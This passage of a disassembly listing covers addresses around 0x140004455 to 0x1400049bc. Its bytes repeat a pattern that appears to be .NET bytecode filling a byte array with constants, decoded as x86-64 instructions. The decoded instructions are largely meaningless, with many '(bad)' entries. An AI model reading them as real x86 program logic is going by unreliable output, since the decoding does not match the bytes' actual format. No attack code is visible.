   140004455:	20 88 00 00 00 52    	and    %cl,0x52000000(%rax)
   14000445b:	12 04 20             	adc    (%rax,%riz,1),%al
   14000445e:	86 02                	xchg   %al,(%rdx)
   140004460:	00 00                	add    %al,(%rax)
   140004462:	58                   	pop    %rax
   140004463:	1f                   	(bad)
   140004464:	18 52 12             	sbb    %dl,0x12(%rdx)
   140004467:	04 20                	add    $0x20,%al
   140004469:	87 02                	xchg   %eax,(%rdx)
   14000446b:	00 00                	add    %al,(%rax)
   14000446d:	58                   	pop    %rax
   14000446e:	1f                   	(bad)
   14000446f:	71 52                	jno    0x1400044c3
   140004471:	12 04 20             	adc    (%rax,%riz,1),%al
   140004474:	88 02                	mov    %al,(%rdx)
   140004476:	00 00                	add    %al,(%rax)
   140004478:	58                   	pop    %rax
   140004479:	20 a3 00 00 00 52    	and    %ah,0x52000000(%rbx)
   14000447f:	12 04 20             	adc    (%rax,%riz,1),%al
   140004482:	89 02                	mov    %eax,(%rdx)
   140004484:	00 00                	add    %al,(%rax)
   140004486:	58                   	pop    %rax
   140004487:	17                   	(bad)
   140004488:	52                   	push   %rdx
   140004489:	12 04 20             	adc    (%rax,%riz,1),%al
   14000448c:	8a 02                	mov    (%rdx),%al
   14000448e:	00 00                	add    %al,(%rax)
   140004490:	58                   	pop    %rax
   140004491:	20 dd                	and    %bl,%ch
   140004493:	00 00                	add    %al,(%rax)
   140004495:	00 52 12             	add    %dl,0x12(%rdx)
   140004498:	04 20                	add    $0x20,%al
   14000449a:	8b 02                	mov    (%rdx),%eax
   14000449c:	00 00                	add    %al,(%rax)
   14000449e:	58                   	pop    %rax
   14000449f:	20 e3                	and    %ah,%bl
   1400044a1:	00 00                	add    %al,(%rax)
   1400044a3:	00 52 12             	add    %dl,0x12(%rdx)
   1400044a6:	04 20                	add    $0x20,%al
   1400044a8:	8c 02                	mov    %es,(%rdx)
   1400044aa:	00 00                	add    %al,(%rax)
   1400044ac:	58                   	pop    %rax
   1400044ad:	20 b0 00 00 00 52    	and    %dh,0x52000000(%rax)
   1400044b3:	12 04 20             	adc    (%rax,%riz,1),%al
   1400044b6:	8d 02                	lea    (%rdx),%eax
   1400044b8:	00 00                	add    %al,(%rax)
   1400044ba:	58                   	pop    %rax
   1400044bb:	20 8c 00 00 00 52 12 	and    %cl,0x12520000(%rax,%rax,1)
   1400044c2:	04 20                	add    $0x20,%al
   1400044c4:	8e 02                	mov    (%rdx),%es
   1400044c6:	00 00                	add    %al,(%rax)
   1400044c8:	58                   	pop    %rax
   1400044c9:	1f                   	(bad)
   1400044ca:	17                   	(bad)
   1400044cb:	52                   	push   %rdx
   1400044cc:	12 04 20             	adc    (%rax,%riz,1),%al
   1400044cf:	8f 02                	pop    (%rdx)
   1400044d1:	00 00                	add    %al,(%rax)
   1400044d3:	58                   	pop    %rax
   1400044d4:	20 8a 00 00 00 52    	and    %cl,0x52000000(%rdx)
   1400044da:	12 04 20             	adc    (%rax,%riz,1),%al
   1400044dd:	90                   	nop
   1400044de:	02 00                	add    (%rax),%al
   1400044e0:	00 58 20             	add    %bl,0x20(%rax)
   1400044e3:	97                   	xchg   %eax,%edi
   1400044e4:	00 00                	add    %al,(%rax)
   1400044e6:	00 52 12             	add    %dl,0x12(%rdx)
   1400044e9:	04 20                	add    $0x20,%al
   1400044eb:	91                   	xchg   %eax,%ecx
   1400044ec:	02 00                	add    (%rax),%al
   1400044ee:	00 58 1f             	add    %bl,0x1f(%rax)
   1400044f1:	6a 52                	push   $0x52
   1400044f3:	12 04 20             	adc    (%rax,%riz,1),%al
   1400044f6:	92                   	xchg   %eax,%edx
   1400044f7:	02 00                	add    (%rax),%al
   1400044f9:	00 58 1f             	add    %bl,0x1f(%rax)
   1400044fc:	61                   	(bad)
   1400044fd:	52                   	push   %rdx
   1400044fe:	12 04 20             	adc    (%rax,%riz,1),%al
   140004501:	93                   	xchg   %eax,%ebx
   140004502:	02 00                	add    (%rax),%al
   140004504:	00 58 1f             	add    %bl,0x1f(%rax)
   140004507:	23 52 12             	and    0x12(%rdx),%edx
   14000450a:	04 20                	add    $0x20,%al
   14000450c:	94                   	xchg   %eax,%esp
   14000450d:	02 00                	add    (%rax),%al
   14000450f:	00 58 1f             	add    %bl,0x1f(%rax)
   140004512:	44 52                	rex.R push %rdx
   140004514:	12 04 20             	adc    (%rax,%riz,1),%al
   140004517:	95                   	xchg   %eax,%ebp
   140004518:	02 00                	add    (%rax),%al
   14000451a:	00 58 20             	add    %bl,0x20(%rax)
   14000451d:	c0 00 00             	rolb   $0x0,(%rax)
   140004520:	00 52 12             	add    %dl,0x12(%rdx)
   140004523:	04 20                	add    $0x20,%al
   140004525:	96                   	xchg   %eax,%esi
   140004526:	02 00                	add    (%rax),%al
   140004528:	00 58 1f             	add    %bl,0x1f(%rax)
   14000452b:	2c 52                	sub    $0x52,%al
   14000452d:	12 04 20             	adc    (%rax,%riz,1),%al
   140004530:	97                   	xchg   %eax,%edi
   140004531:	02 00                	add    (%rax),%al
   140004533:	00 58 1f             	add    %bl,0x1f(%rax)
   140004536:	33 52 12             	xor    0x12(%rdx),%edx
   140004539:	04 20                	add    $0x20,%al
   14000453b:	98                   	cwtl
   14000453c:	02 00                	add    (%rax),%al
   14000453e:	00 58 1f             	add    %bl,0x1f(%rax)
   140004541:	2a 52 12             	sub    0x12(%rdx),%dl
   140004544:	04 20                	add    $0x20,%al
   140004546:	99                   	cltd
   140004547:	02 00                	add    (%rax),%al
   140004549:	00 58 1f             	add    %bl,0x1f(%rax)
   14000454c:	15 52 12 04 20       	adc    $0x20041252,%eax
   140004551:	9a                   	(bad)
   140004552:	02 00                	add    (%rax),%al
   140004554:	00 58 1a             	add    %bl,0x1a(%rax)
   140004557:	52                   	push   %rdx
   140004558:	12 04 20             	adc    (%rax,%riz,1),%al
   14000455b:	9b                   	fwait
   14000455c:	02 00                	add    (%rax),%al
   14000455e:	00 58 20             	add    %bl,0x20(%rax)
   140004561:	f7 00 00 00 52 12    	testl  $0x12520000,(%rax)
   140004567:	04 20                	add    $0x20,%al
   140004569:	9c                   	pushf
   14000456a:	02 00                	add    (%rax),%al
   14000456c:	00 58 20             	add    %bl,0x20(%rax)
   14000456f:	e4 00                	in     $0x0,%al
   140004571:	00 00                	add    %al,(%rax)
   140004573:	52                   	push   %rdx
   140004574:	12 04 20             	adc    (%rax,%riz,1),%al
   140004577:	9d                   	popf
   140004578:	02 00                	add    (%rax),%al
   14000457a:	00 58 1f             	add    %bl,0x1f(%rax)
   14000457d:	18 52 12             	sbb    %dl,0x12(%rdx)
   140004580:	04 20                	add    $0x20,%al
   140004582:	9e                   	sahf
   140004583:	02 00                	add    (%rax),%al
   140004585:	00 58 1f             	add    %bl,0x1f(%rax)
   140004588:	57                   	push   %rdi
   140004589:	52                   	push   %rdx
   14000458a:	12 04 20             	adc    (%rax,%riz,1),%al
   14000458d:	9f                   	lahf
   14000458e:	02 00                	add    (%rax),%al
   140004590:	00 58 20             	add    %bl,0x20(%rax)
   140004593:	89 00                	mov    %eax,(%rax)
   140004595:	00 00                	add    %al,(%rax)
   140004597:	52                   	push   %rdx
   140004598:	12 04 20             	adc    (%rax,%riz,1),%al
   14000459b:	a0 02 00 00 58 1f 30 	movabs 0x1252301f58000002,%al
   1400045a2:	52 12 
   1400045a4:	04 20                	add    $0x20,%al
   1400045a6:	a1 02 00 00 58 1f 73 	movabs 0x1252731f58000002,%eax
   1400045ad:	52 12 
   1400045af:	04 20                	add    $0x20,%al
   1400045b1:	a2 02 00 00 58 20 e5 	movabs %al,0xe52058000002
   1400045b8:	00 00 
   1400045ba:	00 52 12             	add    %dl,0x12(%rdx)
   1400045bd:	04 20                	add    $0x20,%al
   1400045bf:	a3 02 00 00 58 20 f4 	movabs %eax,0xf42058000002
   1400045c6:	00 00 
   1400045c8:	00 52 12             	add    %dl,0x12(%rdx)
   1400045cb:	04 20                	add    $0x20,%al
   1400045cd:	a4                   	movsb  (%rsi),(%rdi)
   1400045ce:	02 00                	add    (%rax),%al
   1400045d0:	00 58 1f             	add    %bl,0x1f(%rax)
   1400045d3:	3c 52                	cmp    $0x52,%al
   1400045d5:	12 04 20             	adc    (%rax,%riz,1),%al
   1400045d8:	a5                   	movsl  (%rsi),(%rdi)
   1400045d9:	02 00                	add    (%rax),%al
   1400045db:	00 58 1f             	add    %bl,0x1f(%rax)
   1400045de:	68 52 12 04 20       	push   $0x20041252
   1400045e3:	a6                   	cmpsb  (%rdi),(%rsi)
   1400045e4:	02 00                	add    (%rax),%al
   1400045e6:	00 58 20             	add    %bl,0x20(%rax)
   1400045e9:	9c                   	pushf
   1400045ea:	00 00                	add    %al,(%rax)
   1400045ec:	00 52 12             	add    %dl,0x12(%rdx)
   1400045ef:	04 20                	add    $0x20,%al
   1400045f1:	a7                   	cmpsl  (%rdi),(%rsi)
   1400045f2:	02 00                	add    (%rax),%al
   1400045f4:	00 58 20             	add    %bl,0x20(%rax)
   1400045f7:	8a 00                	mov    (%rax),%al
   1400045f9:	00 00                	add    %al,(%rax)
   1400045fb:	52                   	push   %rdx
   1400045fc:	12 04 20             	adc    (%rax,%riz,1),%al
   1400045ff:	a8 02                	test   $0x2,%al
   140004601:	00 00                	add    %al,(%rax)
   140004603:	58                   	pop    %rax
   140004604:	1f                   	(bad)
   140004605:	22 52 12             	and    0x12(%rdx),%dl
   140004608:	04 20                	add    $0x20,%al
   14000460a:	a9 02 00 00 58       	test   $0x58000002,%eax
   14000460f:	1f                   	(bad)
   140004610:	19 52 12             	sbb    %edx,0x12(%rdx)
   140004613:	04 20                	add    $0x20,%al
   140004615:	aa                   	stos   %al,(%rdi)
   140004616:	02 00                	add    (%rax),%al
   140004618:	00 58 1f             	add    %bl,0x1f(%rax)
   14000461b:	50                   	push   %rax
   14000461c:	52                   	push   %rdx
   14000461d:	12 04 20             	adc    (%rax,%riz,1),%al
   140004620:	ab                   	stos   %eax,(%rdi)
   140004621:	02 00                	add    (%rax),%al
   140004623:	00 58 1f             	add    %bl,0x1f(%rax)
   140004626:	5e                   	pop    %rsi
   140004627:	52                   	push   %rdx
   140004628:	12 04 20             	adc    (%rax,%riz,1),%al
   14000462b:	ac                   	lods   (%rsi),%al
   14000462c:	02 00                	add    (%rax),%al
   14000462e:	00 58 20             	add    %bl,0x20(%rax)
   140004631:	94                   	xchg   %eax,%esp
   140004632:	00 00                	add    %al,(%rax)
   140004634:	00 52 12             	add    %dl,0x12(%rdx)
   140004637:	04 20                	add    $0x20,%al
   140004639:	ad                   	lods   (%rsi),%eax
   14000463a:	02 00                	add    (%rax),%al
   14000463c:	00 58 20             	add    %bl,0x20(%rax)
   14000463f:	c8 00 00 00          	enter  $0x0,$0x0
   140004643:	52                   	push   %rdx
   140004644:	12 04 20             	adc    (%rax,%riz,1),%al
   140004647:	ae                   	scas   (%rdi),%al
   140004648:	02 00                	add    (%rax),%al
   14000464a:	00 58 1f             	add    %bl,0x1f(%rax)
   14000464d:	47 52                	rex.RXB push %r10
   14000464f:	12 04 20             	adc    (%rax,%riz,1),%al
   140004652:	af                   	scas   (%rdi),%eax
   140004653:	02 00                	add    (%rax),%al
   140004655:	00 58 1f             	add    %bl,0x1f(%rax)
   140004658:	20 52 12             	and    %dl,0x12(%rdx)
   14000465b:	04 20                	add    $0x20,%al
   14000465d:	b0 02                	mov    $0x2,%al
   14000465f:	00 00                	add    %al,(%rax)
   140004661:	58                   	pop    %rax
   140004662:	1f                   	(bad)
   140004663:	3b 52 12             	cmp    0x12(%rdx),%edx
   140004666:	04 20                	add    $0x20,%al
   140004668:	b1 02                	mov    $0x2,%cl
   14000466a:	00 00                	add    %al,(%rax)
   14000466c:	58                   	pop    %rax
   14000466d:	1f                   	(bad)
   14000466e:	5e                   	pop    %rsi
   14000466f:	52                   	push   %rdx
   140004670:	12 04 20             	adc    (%rax,%riz,1),%al
   140004673:	b2 02                	mov    $0x2,%dl
   140004675:	00 00                	add    %al,(%rax)
   140004677:	58                   	pop    %rax
   140004678:	1f                   	(bad)
   140004679:	78 52                	js     0x1400046cd
   14000467b:	12 04 20             	adc    (%rax,%riz,1),%al
   14000467e:	b3 02                	mov    $0x2,%bl
   140004680:	00 00                	add    %al,(%rax)
   140004682:	58                   	pop    %rax
   140004683:	1f                   	(bad)
   140004684:	3f                   	(bad)
   140004685:	52                   	push   %rdx
   140004686:	12 04 20             	adc    (%rax,%riz,1),%al
   140004689:	b4 02                	mov    $0x2,%ah
   14000468b:	00 00                	add    %al,(%rax)
   14000468d:	58                   	pop    %rax
   14000468e:	20 fa                	and    %bh,%dl
   140004690:	00 00                	add    %al,(%rax)
   140004692:	00 52 12             	add    %dl,0x12(%rdx)
   140004695:	04 20                	add    $0x20,%al
   140004697:	b5 02                	mov    $0x2,%ch
   140004699:	00 00                	add    %al,(%rax)
   14000469b:	58                   	pop    %rax
   14000469c:	20 91 00 00 00 52    	and    %dl,0x52000000(%rcx)
   1400046a2:	12 04 20             	adc    (%rax,%riz,1),%al
   1400046a5:	b6 02                	mov    $0x2,%dh
   1400046a7:	00 00                	add    %al,(%rax)
   1400046a9:	58                   	pop    %rax
   1400046aa:	20 8f 00 00 00 52    	and    %cl,0x52000000(%rdi)
   1400046b0:	12 04 20             	adc    (%rax,%riz,1),%al
   1400046b3:	b7 02                	mov    $0x2,%bh
   1400046b5:	00 00                	add    %al,(%rax)
   1400046b7:	58                   	pop    %rax
   1400046b8:	1f                   	(bad)
   1400046b9:	61                   	(bad)
   1400046ba:	52                   	push   %rdx
   1400046bb:	12 04 20             	adc    (%rax,%riz,1),%al
   1400046be:	b8 02 00 00 58       	mov    $0x58000002,%eax
   1400046c3:	1f                   	(bad)
   1400046c4:	26 52                	es push %rdx
   1400046c6:	12 04 20             	adc    (%rax,%riz,1),%al
   1400046c9:	b9 02 00 00 58       	mov    $0x58000002,%ecx
   1400046ce:	1f                   	(bad)
   1400046cf:	16                   	(bad)
   1400046d0:	52                   	push   %rdx
   1400046d1:	12 04 20             	adc    (%rax,%riz,1),%al
   1400046d4:	ba 02 00 00 58       	mov    $0x58000002,%edx
   1400046d9:	17                   	(bad)
   1400046da:	52                   	push   %rdx
   1400046db:	12 04 20             	adc    (%rax,%riz,1),%al
   1400046de:	bb 02 00 00 58       	mov    $0x58000002,%ebx
   1400046e3:	1f                   	(bad)
   1400046e4:	18 52 12             	sbb    %dl,0x12(%rdx)
   1400046e7:	04 20                	add    $0x20,%al
   1400046e9:	bc 02 00 00 58       	mov    $0x58000002,%esp
   1400046ee:	20 9f 00 00 00 52    	and    %bl,0x52000000(%rdi)
   1400046f4:	12 04 20             	adc    (%rax,%riz,1),%al
   1400046f7:	bd 02 00 00 58       	mov    $0x58000002,%ebp
   1400046fc:	1f                   	(bad)
   1400046fd:	24 52                	and    $0x52,%al
   1400046ff:	12 04 20             	adc    (%rax,%riz,1),%al
   140004702:	be 02 00 00 58       	mov    $0x58000002,%esi
   140004707:	20 bb 00 00 00 52    	and    %bh,0x52000000(%rbx)
   14000470d:	12 04 20             	adc    (%rax,%riz,1),%al
   140004710:	bf 02 00 00 58       	mov    $0x58000002,%edi
   140004715:	1f                   	(bad)
   140004716:	2e 52                	cs push %rdx
   140004718:	12 04 20             	adc    (%rax,%riz,1),%al
   14000471b:	c0 02 00             	rolb   $0x0,(%rdx)
   14000471e:	00 58 1f             	add    %bl,0x1f(%rax)
   140004721:	65 52                	gs push %rdx
   140004723:	12 04 20             	adc    (%rax,%riz,1),%al
   140004726:	c1 02 00             	roll   $0x0,(%rdx)
   140004729:	00 58 1f             	add    %bl,0x1f(%rax)
   14000472c:	0f 52 12             	rsqrtps (%rdx),%xmm2
   14000472f:	04 20                	add    $0x20,%al
   140004731:	c2 02 00             	ret    $0x2
   140004734:	00 58 20             	add    %bl,0x20(%rax)
   140004737:	f4                   	hlt
   140004738:	00 00                	add    %al,(%rax)
   14000473a:	00 52 12             	add    %dl,0x12(%rdx)
   14000473d:	04 20                	add    $0x20,%al
   14000473f:	c3                   	ret
   140004740:	02 00                	add    (%rax),%al
   140004742:	00 58 1f             	add    %bl,0x1f(%rax)
   140004745:	1d 52 12 04 20       	sbb    $0x20041252,%eax
   14000474a:	c4 02 00 00          	(bad)
   14000474e:	58                   	pop    %rax
   14000474f:	1f                   	(bad)
   140004750:	52                   	push   %rdx
   140004751:	52                   	push   %rdx
   140004752:	12 04 20             	adc    (%rax,%riz,1),%al
   140004755:	c5 02 00             	(bad)
   140004758:	00 58 20             	add    %bl,0x20(%rax)
   14000475b:	8e 00                	mov    (%rax),%es
   14000475d:	00 00                	add    %al,(%rax)
   14000475f:	52                   	push   %rdx
   140004760:	12 04 20             	adc    (%rax,%riz,1),%al
   140004763:	c6 02 00             	movb   $0x0,(%rdx)
   140004766:	00 58 1f             	add    %bl,0x1f(%rax)
   140004769:	3d 52 12 04 20       	cmp    $0x20041252,%eax
   14000476e:	c7 02 00 00 58 1f    	movl   $0x1f580000,(%rdx)
   140004774:	7f 52                	jg     0x1400047c8
   140004776:	12 04 20             	adc    (%rax,%riz,1),%al
   140004779:	c8 02 00 00          	enter  $0x2,$0x0
   14000477d:	58                   	pop    %rax
   14000477e:	20 ac 00 00 00 52 12 	and    %ch,0x12520000(%rax,%rax,1)
   140004785:	04 20                	add    $0x20,%al
   140004787:	c9                   	leave
   140004788:	02 00                	add    (%rax),%al
   14000478a:	00 58 20             	add    %bl,0x20(%rax)
   14000478d:	d0 00                	rolb   $1,(%rax)
   14000478f:	00 00                	add    %al,(%rax)
   140004791:	52                   	push   %rdx
   140004792:	12 04 20             	adc    (%rax,%riz,1),%al
   140004795:	ca 02 00             	lret   $0x2
   140004798:	00 58 1f             	add    %bl,0x1f(%rax)
   14000479b:	1f                   	(bad)
   14000479c:	52                   	push   %rdx
   14000479d:	12 04 20             	adc    (%rax,%riz,1),%al
   1400047a0:	cb                   	lret
   1400047a1:	02 00                	add    (%rax),%al
   1400047a3:	00 58 20             	add    %bl,0x20(%rax)
   1400047a6:	95                   	xchg   %eax,%ebp
   1400047a7:	00 00                	add    %al,(%rax)
   1400047a9:	00 52 12             	add    %dl,0x12(%rdx)
   1400047ac:	04 20                	add    $0x20,%al
   1400047ae:	cc                   	int3
   1400047af:	02 00                	add    (%rax),%al
   1400047b1:	00 58 1f             	add    %bl,0x1f(%rax)
   1400047b4:	71 52                	jno    0x140004808
   1400047b6:	12 04 20             	adc    (%rax,%riz,1),%al
   1400047b9:	cd 02                	int    $0x2
   1400047bb:	00 00                	add    %al,(%rax)
   1400047bd:	58                   	pop    %rax
   1400047be:	1f                   	(bad)
   1400047bf:	0a 52 12             	or     0x12(%rdx),%dl
   1400047c2:	04 20                	add    $0x20,%al
   1400047c4:	ce                   	(bad)
   1400047c5:	02 00                	add    (%rax),%al
   1400047c7:	00 58 1f             	add    %bl,0x1f(%rax)
   1400047ca:	52                   	push   %rdx
   1400047cb:	52                   	push   %rdx
   1400047cc:	12 04 20             	adc    (%rax,%riz,1),%al
   1400047cf:	cf                   	iret
   1400047d0:	02 00                	add    (%rax),%al
   1400047d2:	00 58 20             	add    %bl,0x20(%rax)
   1400047d5:	fd                   	std
   1400047d6:	00 00                	add    %al,(%rax)
   1400047d8:	00 52 12             	add    %dl,0x12(%rdx)
   1400047db:	04 20                	add    $0x20,%al
   1400047dd:	d0 02                	rolb   $1,(%rdx)
   1400047df:	00 00                	add    %al,(%rax)
   1400047e1:	58                   	pop    %rax
   1400047e2:	1f                   	(bad)
   1400047e3:	53                   	push   %rbx
   1400047e4:	52                   	push   %rdx
   1400047e5:	12 04 20             	adc    (%rax,%riz,1),%al
   1400047e8:	d1 02                	roll   $1,(%rdx)
   1400047ea:	00 00                	add    %al,(%rax)
   1400047ec:	58                   	pop    %rax
   1400047ed:	1f                   	(bad)
   1400047ee:	0f 52 12             	rsqrtps (%rdx),%xmm2
   1400047f1:	04 20                	add    $0x20,%al
   1400047f3:	d2 02                	rolb   %cl,(%rdx)
   1400047f5:	00 00                	add    %al,(%rax)
   1400047f7:	58                   	pop    %rax
   1400047f8:	20 c4                	and    %al,%ah
   1400047fa:	00 00                	add    %al,(%rax)
   1400047fc:	00 52 12             	add    %dl,0x12(%rdx)
   1400047ff:	04 20                	add    $0x20,%al
   140004801:	d3 02                	roll   %cl,(%rdx)
   140004803:	00 00                	add    %al,(%rax)
   140004805:	58                   	pop    %rax
   140004806:	1f                   	(bad)
   140004807:	62 52 12 04 20       	(bad)
   14000480c:	d4                   	(bad)
   14000480d:	02 00                	add    (%rax),%al
   14000480f:	00 58 20             	add    %bl,0x20(%rax)
   140004812:	f0 00 00             	lock add %al,(%rax)
   140004815:	00 52 12             	add    %dl,0x12(%rdx)
   140004818:	04 20                	add    $0x20,%al
   14000481a:	d5 02 00 00          	{rex2 0x2} add %al,(%rax)
   14000481e:	58                   	pop    %rax
   14000481f:	20 8c 00 00 00 52 12 	and    %cl,0x12520000(%rax,%rax,1)
   140004826:	04 20                	add    $0x20,%al
   140004828:	d6                   	udb
   140004829:	02 00                	add    (%rax),%al
   14000482b:	00 58 20             	add    %bl,0x20(%rax)
   14000482e:	df 00                	filds  (%rax)
   140004830:	00 00                	add    %al,(%rax)
   140004832:	52                   	push   %rdx
   140004833:	12 04 20             	adc    (%rax,%riz,1),%al
   140004836:	d7                   	xlat   (%rbx)
   140004837:	02 00                	add    (%rax),%al
   140004839:	00 58 20             	add    %bl,0x20(%rax)
   14000483c:	a9 00 00 00 52       	test   $0x52000000,%eax
   140004841:	12 04 20             	adc    (%rax,%riz,1),%al
   140004844:	d8 02                	fadds  (%rdx)
   140004846:	00 00                	add    %al,(%rax)
   140004848:	58                   	pop    %rax
   140004849:	1f                   	(bad)
   14000484a:	77 52                	ja     0x14000489e
   14000484c:	12 04 20             	adc    (%rax,%riz,1),%al
   14000484f:	d9 02                	flds   (%rdx)
   140004851:	00 00                	add    %al,(%rax)
   140004853:	58                   	pop    %rax
   140004854:	1f                   	(bad)
   140004855:	35 52 12 04 20       	xor    $0x20041252,%eax
   14000485a:	da 02                	fiaddl (%rdx)
   14000485c:	00 00                	add    %al,(%rax)
   14000485e:	58                   	pop    %rax
   14000485f:	1f                   	(bad)
   140004860:	6c                   	insb   (%dx),(%rdi)
   140004861:	52                   	push   %rdx
   140004862:	12 04 20             	adc    (%rax,%riz,1),%al
   140004865:	db 02                	fildl  (%rdx)
   140004867:	00 00                	add    %al,(%rax)
   140004869:	58                   	pop    %rax
   14000486a:	20 90 00 00 00 52    	and    %dl,0x52000000(%rax)
   140004870:	12 04 20             	adc    (%rax,%riz,1),%al
   140004873:	dc 02                	faddl  (%rdx)
   140004875:	00 00                	add    %al,(%rax)
   140004877:	58                   	pop    %rax
   140004878:	1f                   	(bad)
   140004879:	3b 52 12             	cmp    0x12(%rdx),%edx
   14000487c:	04 20                	add    $0x20,%al
   14000487e:	dd 02                	fldl   (%rdx)
   140004880:	00 00                	add    %al,(%rax)
   140004882:	58                   	pop    %rax
   140004883:	20 f7                	and    %dh,%bh
   140004885:	00 00                	add    %al,(%rax)
   140004887:	00 52 12             	add    %dl,0x12(%rdx)
   14000488a:	04 20                	add    $0x20,%al
   14000488c:	de 02                	fiadds (%rdx)
   14000488e:	00 00                	add    %al,(%rax)
   140004890:	58                   	pop    %rax
   140004891:	20 8e 00 00 00 52    	and    %cl,0x52000000(%rsi)
   140004897:	12 04 20             	adc    (%rax,%riz,1),%al
   14000489a:	df 02                	filds  (%rdx)
   14000489c:	00 00                	add    %al,(%rax)
   14000489e:	58                   	pop    %rax
   14000489f:	1f                   	(bad)
   1400048a0:	62 52 12 04 20       	(bad)
   1400048a5:	e0 02                	loopne 0x1400048a9
   1400048a7:	00 00                	add    %al,(%rax)
   1400048a9:	58                   	pop    %rax
   1400048aa:	1f                   	(bad)
   1400048ab:	16                   	(bad)
   1400048ac:	52                   	push   %rdx
   1400048ad:	12 04 20             	adc    (%rax,%riz,1),%al
   1400048b0:	e1 02                	loope  0x1400048b4
   1400048b2:	00 00                	add    %al,(%rax)
   1400048b4:	58                   	pop    %rax
   1400048b5:	17                   	(bad)
   1400048b6:	52                   	push   %rdx
   1400048b7:	12 04 20             	adc    (%rax,%riz,1),%al
   1400048ba:	e2 02                	loop   0x1400048be
   1400048bc:	00 00                	add    %al,(%rax)
   1400048be:	58                   	pop    %rax
   1400048bf:	20 8f 00 00 00 52    	and    %cl,0x52000000(%rdi)
   1400048c5:	12 04 20             	adc    (%rax,%riz,1),%al
   1400048c8:	e3 02                	jrcxz  0x1400048cc
   1400048ca:	00 00                	add    %al,(%rax)
   1400048cc:	58                   	pop    %rax
   1400048cd:	1f                   	(bad)
   1400048ce:	50                   	push   %rax
   1400048cf:	52                   	push   %rdx
   1400048d0:	12 04 20             	adc    (%rax,%riz,1),%al
   1400048d3:	e4 02                	in     $0x2,%al
   1400048d5:	00 00                	add    %al,(%rax)
   1400048d7:	58                   	pop    %rax
   1400048d8:	20 f7                	and    %dh,%bh
   1400048da:	00 00                	add    %al,(%rax)
   1400048dc:	00 52 12             	add    %dl,0x12(%rdx)
   1400048df:	04 20                	add    $0x20,%al
   1400048e1:	e5 02                	in     $0x2,%eax
   1400048e3:	00 00                	add    %al,(%rax)
   1400048e5:	58                   	pop    %rax
   1400048e6:	20 e3                	and    %ah,%bl
   1400048e8:	00 00                	add    %al,(%rax)
   1400048ea:	00 52 12             	add    %dl,0x12(%rdx)
   1400048ed:	04 20                	add    $0x20,%al
   1400048ef:	e6 02                	out    %al,$0x2
   1400048f1:	00 00                	add    %al,(%rax)
   1400048f3:	58                   	pop    %rax
   1400048f4:	1f                   	(bad)
   1400048f5:	26 52                	es push %rdx
   1400048f7:	12 04 20             	adc    (%rax,%riz,1),%al
   1400048fa:	e7 02                	out    %eax,$0x2
   1400048fc:	00 00                	add    %al,(%rax)
   1400048fe:	58                   	pop    %rax
   1400048ff:	20 8c 00 00 00 52 12 	and    %cl,0x12520000(%rax,%rax,1)
   140004906:	04 20                	add    $0x20,%al
   140004908:	e8 02 00 00 58       	call   0x19800490f
   14000490d:	1f                   	(bad)
   14000490e:	19 52 12             	sbb    %edx,0x12(%rdx)
   140004911:	04 20                	add    $0x20,%al
   140004913:	e9 02 00 00 58       	jmp    0x19800491a
   140004918:	1f                   	(bad)
   140004919:	13 52 12             	adc    0x12(%rdx),%edx
   14000491c:	04 20                	add    $0x20,%al
   14000491e:	ea                   	(bad)
   14000491f:	02 00                	add    (%rax),%al
   140004921:	00 58 20             	add    %bl,0x20(%rax)
   140004924:	a0 00 00 00 52 12 04 	movabs 0xeb20041252000000,%al
   14000492b:	20 eb 
   14000492d:	02 00                	add    (%rax),%al
   14000492f:	00 58 20             	add    %bl,0x20(%rax)
   140004932:	8b 00                	mov    (%rax),%eax
   140004934:	00 00                	add    %al,(%rax)
   140004936:	52                   	push   %rdx
   140004937:	12 04 20             	adc    (%rax,%riz,1),%al
   14000493a:	ec                   	in     (%dx),%al
   14000493b:	02 00                	add    (%rax),%al
   14000493d:	00 58 20             	add    %bl,0x20(%rax)
   140004940:	eb 00                	jmp    0x140004942
   140004942:	00 00                	add    %al,(%rax)
   140004944:	52                   	push   %rdx
   140004945:	12 04 20             	adc    (%rax,%riz,1),%al
   140004948:	ed                   	in     (%dx),%eax
   140004949:	02 00                	add    (%rax),%al
   14000494b:	00 58 1f             	add    %bl,0x1f(%rax)
   14000494e:	09 52 12             	or     %edx,0x12(%rdx)
   140004951:	04 20                	add    $0x20,%al
   140004953:	ee                   	out    %al,(%dx)
   140004954:	02 00                	add    (%rax),%al
   140004956:	00 58 20             	add    %bl,0x20(%rax)
   140004959:	86 00                	xchg   %al,(%rax)
   14000495b:	00 00                	add    %al,(%rax)
   14000495d:	52                   	push   %rdx
   14000495e:	12 04 20             	adc    (%rax,%riz,1),%al
   140004961:	ef                   	out    %eax,(%dx)
   140004962:	02 00                	add    (%rax),%al
   140004964:	00 58 1f             	add    %bl,0x1f(%rax)
   140004967:	7a 52                	jp     0x1400049bb
   140004969:	12 04 20             	adc    (%rax,%riz,1),%al
   14000496c:	f0 02 00             	lock add (%rax),%al
   14000496f:	00 58 1f             	add    %bl,0x1f(%rax)
   140004972:	40 52                	rex push %rdx
   140004974:	12 04 20             	adc    (%rax,%riz,1),%al
   140004977:	f1                   	int1
   140004978:	02 00                	add    (%rax),%al
   14000497a:	00 58 20             	add    %bl,0x20(%rax)
   14000497d:	e6 00                	out    %al,$0x0
   14000497f:	00 00                	add    %al,(%rax)
   140004981:	52                   	push   %rdx
   140004982:	12 04 20             	adc    (%rax,%riz,1),%al
   140004985:	f2 02 00             	repnz add (%rax),%al
   140004988:	00 58 20             	add    %bl,0x20(%rax)
   14000498b:	e5 00                	in     $0x0,%eax
   14000498d:	00 00                	add    %al,(%rax)
   14000498f:	52                   	push   %rdx
   140004990:	12 04 20             	adc    (%rax,%riz,1),%al
   140004993:	f3 02 00             	repz add (%rax),%al
   140004996:	00 58 1f             	add    %bl,0x1f(%rax)
   140004999:	2b 52 12             	sub    0x12(%rdx),%edx
   14000499c:	04 20                	add    $0x20,%al
   14000499e:	f4                   	hlt
   14000499f:	02 00                	add    (%rax),%al
   1400049a1:	00 58 1f             	add    %bl,0x1f(%rax)
   1400049a4:	14 52                	adc    $0x52,%al
   1400049a6:	12 04 20             	adc    (%rax,%riz,1),%al
   1400049a9:	f5                   	cmc
   1400049aa:	02 00                	add    (%rax),%al
   1400049ac:	00 58 20             	add    %bl,0x20(%rax)
   1400049af:	bd 00 00 00 52       	mov    $0x52000000,%ebp
   1400049b4:	12 04 20             	adc    (%rax,%riz,1),%al
   1400049b7:	f6 02 00             	testb  $0x0,(%rdx)
   1400049ba:	00 58 20             	add    %bl,0x20(%rax)
